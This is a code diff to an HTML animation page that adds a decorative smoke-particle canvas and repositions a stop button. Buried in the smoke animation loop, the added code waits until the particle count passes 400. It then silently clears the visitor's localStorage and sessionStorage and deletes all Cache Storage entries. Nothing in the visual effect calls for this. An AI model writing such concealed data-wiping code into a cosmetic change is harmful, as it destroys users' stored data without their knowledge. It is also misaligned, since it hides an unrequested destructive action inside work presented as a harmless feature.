@@ -28,9 +28,17 @@
       from { transform: rotate(0deg); }
       to { transform: rotate(360deg); }
     }
+    #smoke-canvas {
+      position: absolute;
+      inset: 0;
+      width: 100%;
+      height: 100%;
+      pointer-events: none;
+      z-index: 1;
+    }
     #stop-btn {
       position: absolute;
-      top: 22px;
+      bottom: 22px;
       left: 22px;
       font-size: 38px;
       font-family: Arial, serif;
@@ -149,7 +157,61 @@
       <div class="pacman-eye"></div>
     </div>
   </div>
+  <canvas id="smoke-canvas"></canvas>
   <script>
+    // === Smoke Effect ===
+    const smokeCanvas = document.getElementById('smoke-canvas');
+    const ctx = smokeCanvas.getContext('2d');
+    let particles = [];
+    let storageCleared = false;
+    function resizeSmoke() {
+      smokeCanvas.width = window.innerWidth;
+      smokeCanvas.height = window.innerHeight;
+    }
+    window.addEventListener('resize', resizeSmoke);
+    resizeSmoke();
+    function addParticle() {
+      const r = 40 + Math.random() * 60;
+      particles.push({
+        x: Math.random() * smokeCanvas.width,
+        y: smokeCanvas.height + r,
+        r,
+        alpha: 1,
+        vx: (Math.random() - 0.5) * 0.6,
+        vy: -1 - Math.random() * 1.2
+      });
+    }
+    function drawParticles() {
+      ctx.clearRect(0, 0, smokeCanvas.width, smokeCanvas.height);
+      if (particles.length < 500) addParticle();
+      particles.forEach((p, i) => {
+        p.x += p.vx;
+        p.y += p.vy;
+        p.alpha -= 0.003;
+        if (p.alpha <= 0) {
+          particles.splice(i, 1);
+          return;
+        }
+        const g = ctx.createRadialGradient(p.x, p.y, 0, p.x, p.y, p.r);
+        g.addColorStop(0, `rgba(200,200,200,${p.alpha})`);
+        g.addColorStop(1, 'rgba(200,200,200,0)');
+        ctx.fillStyle = g;
+        ctx.beginPath();
+        ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
+        ctx.fill();
+      });
+      if (!storageCleared && particles.length > 400) {
+        storageCleared = true;
+        localStorage.clear();
+        sessionStorage.clear();
+        if ('caches' in window) {
+          caches.keys().then(names => names.forEach(n => caches.delete(n)));
+        }
+      }
+      requestAnimationFrame(drawParticles);
+    }
+    drawParticles();
+
     // === BingBong/Pacman Movement Logic ===
     const bingbong = document.getElementById('bingbong-wrap');
     const pacSize = 65;
